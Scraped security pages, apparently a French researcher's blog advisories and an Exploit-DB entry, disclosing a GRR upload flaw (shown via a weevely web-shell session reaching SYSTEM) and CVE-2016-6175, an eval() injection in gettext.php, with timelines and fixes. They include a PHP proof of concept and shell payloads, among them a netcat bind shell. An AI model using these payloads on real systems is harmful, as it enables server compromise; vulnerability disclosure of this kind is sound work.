    [+] weevely 3.2.0

    [+] Target:    laboratoire.target.fr:F:\server\grr\images

    [+] Session:    /kmkz/.weevely/sessions/laboratoire.target.fr/logo\_1.session

    [+] Shell:    System shell*

    *[+] Browse the filesystem or execute commands starts the connection

    [+] to the target. Type :help for more information.

    weevely> whoami

    autorite nt\system*

**IV. RISK

======================================================================================**

By uploading a script, an attacker may be able to execute arbitrary code

on the server with elevated privileges.

This flaw may compromise the integrity of the system

(with access to sensitive informations, network shares...) and it may conduce

to  full information system's compromission using pivots techniques and imagination!

**V. VERSIONS AFFECTED

======================================================================================**

GRR 3.0.0-RC1 is vulnerable (and all previous versions)

**VI. TIMELINE

======================================================================================**

December 17th, 2015: Vulnerability identification

January 7th, 2016: Vendor and project developers notification

January 11th, 2016: Project developers response

January 15th, 2016: Patch release

January 17th, 2016: Public disclosure

**======================================================================================**

[Projet GRR](https://github.com/JeromeDevome/GRR/blob/master/admin/admin_config1.php)

[Git Hub du projet contenant le fix](https://github.com/JeromeDevome/GRR/blob/master/admin/admin_config1.php)

[Publication de Nicolas Bouteiller (contributeur/dev de la prochaine version GRR)](http://www.kaizendo.fr/php-how-to-manage-uploaded-image-in-secure-way/)

So now, update your GRR install ;-)

A bientôt pour de nouvelles aventures !!!

Publié par

[kmkz](https://www.blogger.com/profile/11354372095868320290 "author profile")

à

[19:05](https://kmkz-web-blog.blogspot.com/2016/01/advisory-vulnerabilite-dans-grr-300-rc1.html "permanent link")

[Aucun commentaire:](https://www.blogger.com/comment/fullpage/post/4457623080129847893/4063553058483654081)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4457623080129847893&postID=4063553058483654081&from=pencil "Modifier l'article")

[Articles plus récents](https://kmkz-web-blog.blogspot.com/ "Articles plus récents")

[Articles plus anciens](https://kmkz-web-blog.blogspot.com/search?updated-max=2016-01-17T19:05:00%2B01:00&max-results=1 "Articles plus anciens")

[Accueil](https://kmkz-web-blog.blogspot.com/)

Inscription à :
[Articles (Atom)](https://kmkz-web-blog.blogspot.com/feeds/posts/default)

## Archives

* ►
  [2017](https://kmkz-web-blog.blogspot.com/2017/)
  (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2017/03/)
    (1)

* ▼
  [2016](https://kmkz-web-blog.blogspot.com/2016/)
  (3)
  + ▼
    [juil.](https://kmkz-web-blog.blogspot.com/2016/07/)
    (1)
    - [[Advisory] CVE-2016-6175](https://kmkz-web-blog.blogspot.com/2016/07/advisory-cve-2016-6175.html)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2016/03/)
    (1)
    - [[Write-Up] ESGI CTF 2k16 ForensicGio (Forensic 400)](https://kmkz-web-blog.blogspot.com/2016/03/write-up-esgi-ctf-2k16-forensicgio.html)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2016/01/)
    (1)
    - [[Advisory] CVE-2016-1000300 Vulnérabilité dans GRR...](https://kmkz-web-blog.blogspot.com/2016/01/advisory-vulnerabilite-dans-grr-300-rc1.html)

* ►
  [2014](https://kmkz-web-blog.blogspot.com/2014/)
  (5)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2014/11/)
    (1)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2014/02/)
    (3)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2014/01/)
    (1)

* ►
  [2012](https://kmkz-web-blog.blogspot.com/2012/)
  (1)
  + ►
    [déc.](https://kmkz-web-blog.blogspot.com/2012/12/)
    (1)

* ►
  [2011](https://kmkz-web-blog.blogspot.com/2011/)
  (1)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2011/01/)
    (1)

* ►
  [2010](https://kmkz-web-blog.blogspot.com/2010/)
  (4)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2010/11/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2010/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2010/07/)
    (1)

* ►
  [2009](https://kmkz-web-blog.blogspot.com/2009/)
  (5)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2009/04/)
    (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2009/03/)
    (2)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2009/02/)
    (2)

* ►
  [2008](https://kmkz-web-blog.blogspot.com/2008/)
  (13)
  + ►
    [oct.](https://kmkz-web-blog.blogspot.com/2008/10/)
    (1)
  + ►
    [sept.](https://kmkz-web-blog.blogspot.com/2008/09/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2008/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2008/07/)
    (2)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2008/04/)
    (7)

| Friends  * [m\_101](http://binholic.blogspot.com/) * [ZadYree](http://z4d.tuxfamily.org/blog) * [Tosh](tosh-codes.tuxfamily.org) * [Tryks](http://tryks.seraphicsquad.com/blog/) * [rootBSD](http://www.r00ted.com/doku.php) * [Newffr](http://www.newffr.com/) * [Shp](http://shp.seraphicsquad.com/blog/) |  |
| --- | --- |

## abonnés

|  |  |
| --- | --- |

Bourbon Jean-marie (kmkz) - sec0d . Thème Awesome Inc.. Fourni par [Blogger](https://www.blogger.com).



=== Content from kmkz-web-blog.blogspot.com_b920117c_20250126_100203.html ===


# [kmkz's blog](https://kmkz-web-blog.blogspot.com/)

Just another web blog

## 2016/07/25

### [[Advisory] CVE-2016-6175](https://kmkz-web-blog.blogspot.com/2016/07/advisory-cve-2016-6175.html)

# **Title**:
**g****ettext.****php****<= 1.0.12** **unauthenticated** **code
execution with** **POTENTIAL****privileges escalation**

# **Date**: June
25th, 2016
# **Author**:
kmkz (Bourbon Jean-marie) |
@kmkz\_security

# **Project****Homepage**: https://launchpad.net/php-gettext/
# **Download**:
https://launchpad.net/php-gettext/trunk/1.0.12/+download/php-gettext-1.0.12.tar.gz
# **Version**:
1.0.12 (latest release)
# **Tested on**:
Linux Debian, PHP 5.6.19-2+b1

# **CVSS**: **7.1**

# **CVE ID**:
**CVE-2016-6175**
# **OVE ID**:
**OVE-20160705-0004**
# **OSVD****B****ID**: n/a

# Thanks:
**Lars Michelsen** from
NagVis project where this bug was discovered and **Danilo Segan**
from gettext.php team project for
their reactivity and professionalism

# **Credits**:

<https://github.com/NagVis/nagvis/commit/4fe8672a5aec3467da72b5852ca6d283c15adb53>
[https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

# **Fix****es**:
[https://github.com/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/share/ser](https://github.com/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/share/serv)ver/core/ext/php-gettext-1.0.12/gettext.php

[https://bugs.launchpad.net/php-gettext/+bug/1606184](https://bugs.launchpad.net/php-gettext/%2Bbug/1606184)

**g****ettext.php
<= 1.0.12 (latest)**  **local/remote code execution** **with****POTENTIAL****privileges escalation** **issue**

I. APPLICATION

This library
provides PHP functions to read MO files even when gettext is not
compiled in or when appropriate locale is not present on the system.

This issue was
discovered by auditing Nagvis project source code, however NagVis is
not impacted by the following issue.

NagVis is a visualization addon for the well known network
managment system [Nagios](http://www.nagios.org/).

NagVis can be used to visualize Nagios Data, e.g. to display IT
processes like a mail system or a network infrastructure.

II. ADVISORY

A possible remote
(or local) code execution were identified in the **gettext.php**
file allowing an attacker to gain access on the targeted host system
and/or gain application’s privileges throught a
specially crafted .mo language file.

The **$string** variable is not sufficiently
sanitized before
to be submitted to **eval()**
function (which is dangerous) in **select\_string()**
function causing the security issue.

III. VULNERABILITY DESCRIPTION

The
**gettext\_reader****()**funtion try to test magic number that
need to match with .mo files :

**$MAGIC1 =
"\x95\x04\x12\xde";**
**$MAGIC2 =
"\xde\x12\x04\x95**";
If it seems correct
then we’ll continue.

We then extract
forms from .mo file’s header through **get\_plural\_forms()**
function and check them with a deprecated
(*since php 5.3.0* *because it can be easily bypassed
by adding a Null Byte*) **eregi()**
regexp function in order to valid they match the following
pattern:
***plural-forms:
([^\n]\*)\n***
(This regular expression matching have no effect on our payload)

Next step will be to sanitize the obtained expression string before
to practice the fatal eval() on this one.

Here is the impacted code snippet :

*snip...*
 *if (eregi("plural-forms:
([^\n]\*)\n", $header, $regs))*
 *$expr = $regs[1];*
 *else*
 *$expr = "nplurals=2;
plural=n == 1 ? 0 : 1;";*

 *$this->pluralheader
= $this→**sanitize\_plural\_expression($expr)****;***//
The
vulnerable function!!
 *}*
*snip…*

The comments presents at the beginning of
**sanitize\_plural\_expression()** function explain that this one is
here to prevent the **eval()** function attacks called later.

Comments are :
*/\*\* Sanitize plural form expression for use
in PHP eval call.*

 *@access private*
 *@return string sanitized plural form
expression\*\*/*

In fact, the security is guaranteed by a "preg\_replace"
that not permit us to inject specials chars.

*snip...*
function sanitize\_plural\_expression($expr) {

 // Get rid of disallowed characters.
 $expr =
preg\_replace('@[^a-zA-Z0-9\_:;\(\)\?\|\&=!<>+\*/\%-]@', '',
$expr); // « sanitizer »

 // Add parenthesis for tertiary '?'
operator.
 $expr .= ';';
 $res = '';
 $p = 0;
 for ($i = 0; $i < strlen($expr); $i++) {
// no indentation ?
 $ch = $expr[$i];
 switch ($ch) {
 case '?':
 $res .= ' ? (';
 $p++;
 break;
 case ':':
 $res .= ') : (';
 break;
 case ';':
 $res .= str\_repeat( ')', $p) . ';';

 $p = 0;
 break;
 default:
 $res .= $ch;
 }
 }
 return $res;
 }
*snip...*

Code snippet from the vulnerable function that execute eval() on the "sanitized" string :

*snip…*
 $string = $this->get\_plural\_forms();
 $string =
str\_replace('nplurals',"\$total",$string);
 $string = str\_replace("n",$n,$string);
 $string =
str\_replace('plural',"\$plural",$string);

 $total = 0;
 $plural = 0;

  eval("$string");
// eval called
…. launch my shell baby !
*snip…*

However, for example (but not only!) we can call **system**()
function with « sh » parameter in order to launch a /bin/sh
command on the targeted system and allowing us to gain an interactive
shell with application privileges on it.

A real scenario could be that a real attacker overwrites languages
files located in the /nagvis-1.8.5/share/frontend/nagvis-js/locale/
directory, in an internal repository, a Docker shared folder or any
other folder.

He now just have to wait or to execute the payload himself to obtain
his shell, that’s why this vulnerability is not so harmless !

Note :

*Apart from that we could
imagine that the attacker transform the **$expr** variable to
obtain an interactive remote shell without eval() and with (maybe)
more privileges like this :*
*$expr=
(`nc -l -p 1337 -e /bin/sh`);* //
proof of concept and screenshots joined to this advisory

Like a Perl developer could say: « there is more than one way
to do it »
IV. PROOF OF CONCEPT

Following PHP code reproduce the exploitation concept base on the
1.0.9 version
(without a crafted .mo file and joined with this advisory).

V. RECOMMENDATIONS

As explained in the
associated « bug track », it was assumed that PO and MO files would
come from untrusted translators.
Check the
permissions on PO/MO files in order to ensure the provenance and the
fact that is only accessible from trusted parties.

The project's
members are writing a new version that will patch this issue
definitively, thank you to respect their work and to apply this
temporary fix.

VI. VERSIONS AFFECTED

This issue affect the latest GETTEXT .PHP version and were found
in latest stable NAGVIS (1.8.5) version.
It could affect the a lot of web application and/or many website as
long as it will not be updated.

VII. TIMELINE

**June 21th, 2016**: Vulnerability identification
**June 21th, 2016**: Nagvis project developers and gettext.php developers
notification
**June 22th, 2016**: Nagvis project developers response
**June 25th, 2016**: Nagvis Patch release (even if not really affected)
**June
27****th,
2016**: Gettext.php
team response (from Danilo Šegan), exchange started
**July 5th, 2016**:
CVE request ID (mitre) and OVE ID request
**July 7th, 2016**:
***CVE-2016-6175*** attributed by MITRE
**July 25th, 2016**: Public disclosure

VIII. LEGAL NOTICES

The information contained within this advisory is supplied "as-is"
with
no warranties or guarantees of fitness of use or otherwise.

I accept no responsibility for any damage caused by the use or misuse
of this advisory.

[CVE-2016-6175] gettext.php code execution - PoC example:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKFOfVjdEf47tJ1KcjuePCuJai7aKaiyomu6trOjKr5Zv2R8KxtST2h03w1E7yXksQJ_23iJZGIvI3X0Mb5BHU48kuhNY73DEyI6PMWidVf0Z7FL7tUy2xgjdQylVJG2Wj9Pn-CQDwXbhB/s640/cve-2016-6175.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKFOfVjdEf47tJ1KcjuePCuJai7aKaiyomu6trOjKr5Zv2R8KxtST2h03w1E7yXksQJ_23iJZGIvI3X0Mb5BHU48kuhNY73DEyI6PMWidVf0Z7FL7tUy2xgjdQylVJG2Wj9Pn-CQDwXbhB/s1600/cve-2016-6175.png)

Publié par

[kmkz](https://www.blogger.com/profile/11354372095868320290 "author profile")

à

[13:34](https://kmkz-web-blog.blogspot.com/2016/07/advisory-cve-2016-6175.html "permanent link")

[Aucun commentaire:](https://www.blogger.com/comment/fullpage/post/4457623080129847893/1065233655939428122)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4457623080129847893&postID=1065233655939428122&from=pencil "Modifier l'article")

[Articles plus récents](https://kmkz-web-blog.blogspot.com/ "Articles plus récents")

[Articles plus anciens](https://kmkz-web-blog.blogspot.com/search?updated-max=2016-07-25T13:34:00%2B02:00&max-results=1 "Articles plus anciens")

[Accueil](https://kmkz-web-blog.blogspot.com/)

Inscription à :
[Articles (Atom)](https://kmkz-web-blog.blogspot.com/feeds/posts/default)

## Archives

* ►
  [2017](https://kmkz-web-blog.blogspot.com/2017/)
  (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2017/03/)
    (1)

* ▼
  [2016](https://kmkz-web-blog.blogspot.com/2016/)
  (3)
  + ▼
    [juil.](https://kmkz-web-blog.blogspot.com/2016/07/)
    (1)
    - [[Advisory] CVE-2016-6175](https://kmkz-web-blog.blogspot.com/2016/07/advisory-cve-2016-6175.html)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2016/03/)
    (1)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2016/01/)
    (1)

* ►
  [2014](https://kmkz-web-blog.blogspot.com/2014/)
  (5)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2014/11/)
    (1)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2014/02/)
    (3)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2014/01/)
    (1)

* ►
  [2012](https://kmkz-web-blog.blogspot.com/2012/)
  (1)
  + ►
    [déc.](https://kmkz-web-blog.blogspot.com/2012/12/)
    (1)

* ►
  [2011](https://kmkz-web-blog.blogspot.com/2011/)
  (1)
  + ►
    [janv.](https://kmkz-web-blog.blogspot.com/2011/01/)
    (1)

* ►
  [2010](https://kmkz-web-blog.blogspot.com/2010/)
  (4)
  + ►
    [nov.](https://kmkz-web-blog.blogspot.com/2010/11/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2010/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2010/07/)
    (1)

* ►
  [2009](https://kmkz-web-blog.blogspot.com/2009/)
  (5)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2009/04/)
    (1)
  + ►
    [mars](https://kmkz-web-blog.blogspot.com/2009/03/)
    (2)
  + ►
    [févr.](https://kmkz-web-blog.blogspot.com/2009/02/)
    (2)

* ►
  [2008](https://kmkz-web-blog.blogspot.com/2008/)
  (13)
  + ►
    [oct.](https://kmkz-web-blog.blogspot.com/2008/10/)
    (1)
  + ►
    [sept.](https://kmkz-web-blog.blogspot.com/2008/09/)
    (1)
  + ►
    [août](https://kmkz-web-blog.blogspot.com/2008/08/)
    (2)
  + ►
    [juil.](https://kmkz-web-blog.blogspot.com/2008/07/)
    (2)
  + ►
    [avr.](https://kmkz-web-blog.blogspot.com/2008/04/)
    (7)

| Friends  * [m\_101](http://binholic.blogspot.com/) * [ZadYree](http://z4d.tuxfamily.org/blog) * [Tosh](tosh-codes.tuxfamily.org) * [Tryks](http://tryks.seraphicsquad.com/blog/) * [rootBSD](http://www.r00ted.com/doku.php) * [Newffr](http://www.newffr.com/) * [Shp](http://shp.seraphicsquad.com/blog/) |  |
| --- | --- |

## abonnés

|  |  |
| --- | --- |

Bourbon Jean-marie (kmkz) - sec0d . Thème Awesome Inc.. Fourni par [Blogger](https://www.blogger.com).



=== Content from www.exploit-db.com_7cbf329c_20250125_154614.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# PHP gettext 1.0.12 - 'gettext.php' Code Execution

#### EDB-ID:

###### 40154

#### CVE:

###### [2016-6175](https://nvd.nist.gov/vuln/detail/CVE-2016-6175)

---

**EDB Verified:**

#### Author:

###### [kmkz](/?author=2703)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2016-07-25

---

**Vulnerable App:**

```
[CVE-2016-6175] gettext.php <= 1.0.12 unauthenticated code execution with POTENTIAL privileges escalation

# Date: June 25th, 2016
# Author: kmkz (Bourbon Jean-marie) <mail.bourbon@gmail.com> | @kmkz_security
# Project Homepage: https://launchpad.net/php-gettext/
# Download: https://launchpad.net/php-gettext/trunk/1.0.12/+download/php-gettext-1.0.12.tar.gz
# Version: 1.0.12 (latest release)
# Tested on: Linux Debian, PHP 5.6.19-2+b1

# CVSS: 7.1
# OVE ID: OVE-20160705-0004
# CVE ID: CVE-2016-6175
# OSVDB ID: n/a

# Thanks:
Lars Michelsen from NagVis project where this bug was discovered and
Danilo Segan from gettext.php team project for their reactivity and professionalism

# Credits:
https://bugs.launchpad.net/php-gettext/+bug/1606184
https://github.com/NagVis/nagvis/commit/4fe8672a5aec3467da72b5852ca6d283c15adb53

# Fixes:
https://github.com/NagVis/nagvis/blob/4fe8672a5aec3467da72b5852ca6d283c15adb53/share/server/core/ext/php-gettext-1.0.12/gettext.php
https://bugs.launchpad.net/php-gettext/+bug/1606184

gettext.php <= 1.0.12 (latest) local/remote code execution with POTENTIAL privileges escalation issue

I. APPLICATION

This library provides PHP functions to read MO files even when gettext is not compiled in or when appropriate locale is not present on the system.
This issue was discovered by auditing Nagvis project source code, however NagVis is not impacted by the following issue.

NagVis is a visualization addon for the well known network managment system Nagios.
NagVis can be used to visualize Nagios Data, e.g. to display IT processes like a mail system or a network infrastructure.

II. ADVISORY

A possible remote (or local) code execution were identified in the gettext.php file allowing an attacker to gain access on the nagvis host system and/or gain application's privileges throught a specially crafted .mo language file.
The $string variable is not sufficiently sanitized before to be submitted to eval() function (which is dangerous) in select_string() function causing the security issue.

III. VULNERABILITY DESCRIPTION

The gettext_reader() funtion try to test magic number that need to match with .mo files :

$MAGIC1 = "\x95\x04\x12\xde";
$MAGIC2 = "\xde\x12\x04\x95";

If it seems correct then we'll continue.
We then extract forms from .mo file's header through get_plural_forms() function and check them with a deprecated (since php 5.3.0 because it can be easily bypassed by adding a Null Byte) eregi() regexp function in order to valid they match the following pattern:

plural-forms: ([^\n]*)\n

(This regular expression matching have no effect on our payload)

Next step will be to sanitize the obtained expression string before to practice the fatal eval() on this one.

Here is the impacted code snippet :

snip...
if (eregi("plural-forms: ([^\n]*)\n", $header, $regs))
$expr = $regs[1];
else

$expr = "nplurals=2; plural=n == 1 ? 0 : 1;";

$this->pluralheader = $this->sanitize_plural_expression($expr); // The vulnerable function!!
}
snip...

The comments presents at the beginning of sanitize_plural_expression() function explain that this one is here to prevent the eval() function attacks called later.

Comments are :

/** Sanitize plural form expression for use in PHP eval call.
@access private
@return string sanitized plural form expression**/

In fact, the security is guaranteed by a "preg_replace" that not permit us to inject specials chars.

snip...
function sanitize_plural_expression($expr) {

// Get rid of disallowed characters.
$expr = preg_replace('@[^a-zA-Z0-9_:;\(\)\?\|\&=!<>+*/\%-]@', '', $expr); // « sanitizer »
// Add parenthesis for tertiary '?' operator.

$expr .= ';';
$res = '';
$p = 0;

for ($i = 0; $i < strlen($expr); $i++) { // indentation ?
$ch = $expr[$i];

switch ($ch) {

case '?':
$res .= ' ? (';
$p++;

break;

case ':':
$res .= ') : (';

break;

case ';':
$res .= str_repeat( ')', $p) . ';';
$p = 0;

break;

default:

$res .= $ch;

}
}
return $res;
}
snip...

Code snippet from the vulnerable function that execute eval() on the « sanitized string :

snip...
$string = $this->get_plural_forms();
$string = str_replace('nplurals',"\$total",$string);
$string = str_replace("n",$n,$string);
$string = str_replace('plural',"\$plural",$string);

$total = 0;
$plural = 0;

eval("$string"); // eval called .... launch my shell baby !
snip...

However, for example (but not only!) we can call system() function with « sh » parameter in order to launch a /bin/sh command on the targeted system and allowing us to gain an interactive shell with application privileges on it.
A real scenario could be that a real attacker overwrites languages files located in the /nagvis-1.8.5/share/frontend/nagvis-js/locale/ directory, in an internal repository, a Docker shared folder or any other folder.
He now just have to wait or to execute the payload himself to obtain his shell, that's why this vulnerability is not so harmless !

Note :
Apart from that we could imagine that the attacker transform the $expr variable to obtain an interactive remote shell without eval() and with (maybe) more privileges like this :

$expr= (`nc -l -p 1337 -e /bin/sh`); // proof of concept and screenshots joined to this advisory

Like a Perl developer could say:

« there is more than one way to do it »

IV. PROOF OF CONCEPT

Following PHP code reproduce the exploitation concept base on the 1.0.9 version
(without a crafted .mo file and joined with this advisory).

<?php
//$expr= ("system(sh)");  // payload1
//$expr= (`nc -l -p 1337 -e /bin/sh`); // payload that is not eval-dependant
$expr=("phpinfo()"); // payload2 (PoC)

//$expr = preg_replace('@[^a-zA-Z0-9_:;\(\)\?\|\&=!<>+*/\%-]@', '', $expr);//  vuln
$expr = preg_replace('@[^a-zA-Z0-9_:;\(\)\?\|\&=!<>+*/\%-]@', '', $expr);/

$expr .= ';';

 // Add parenthesis for tertiary '?' operator.
$expr .= ';';
$res = '';
$p = 0;
for ($i = 0; $i < strlen($expr); $i++) {
    $ch = $expr[$i];
    switch ($ch) {
        case '?':
            $res .= ' ? (';
            $p++;
            break;
        case ':':
            $res .= ') : (';
            break;
        case ';':
            $res .= str_repeat( ')', $p) . ';';
            $p = 0;
            break;
    default:
        $res .= $ch;
    }
}

// Vulnerable function :
$n= (1);
$total=("1000");

 if (!is_int($n)) {
      throw new InvalidArgumentException(
        "Select_string only accepts integers: " . $n); // test sur la version 2 de gettext.php
}

$string = str_replace('nplurals',"\$total",$res);
$string = str_replace("n",$res,$res);
$string = str_replace('plural',"\$plural",$res);
eval("$string");
?>

V. RECOMMENDATIONS

As explained in the associated « bug track », it was assumed that PO and MO files would come from untrusted translators.
Check the permissions on PO/MO files in order to ensure the provenance and the fact that is only accessible from trusted parties.
The project's members are writing a new version that will patch this issue definitively, thank you to respect their work and to apply this temporary fix.

VI. VERSIONS AFFECTED

This issue affect the latest GETTEXT .PHP version and were found in latest stable NAGVIS (1.8.5) version.
It could affect the a lot of web application and/or many website as long as it will not be updated.

VII. TIMELINE

June 21th, 2016: Vulnerability identification
June 21th, 2016: Nagvis project developers and gettext.php developers notification
June 22th, 2016: Nagvis project developers response
June 25th, 2016: Nagvis Patch release (even if not really affected)
June 27th, 2016: Gettext.php team response (from Danilo ?egan), exchange started
July 5th, 2016: CVE request ID (mitre) and OVE ID request
July 7th, 2016: CVE-2016-6175 attributed by MITRE
July 25th, 2016: Public disclosure

VIII. LEGAL NOTICES

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise.
I accept no responsibility for any damage caused by the use or misuse of this advisory.

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

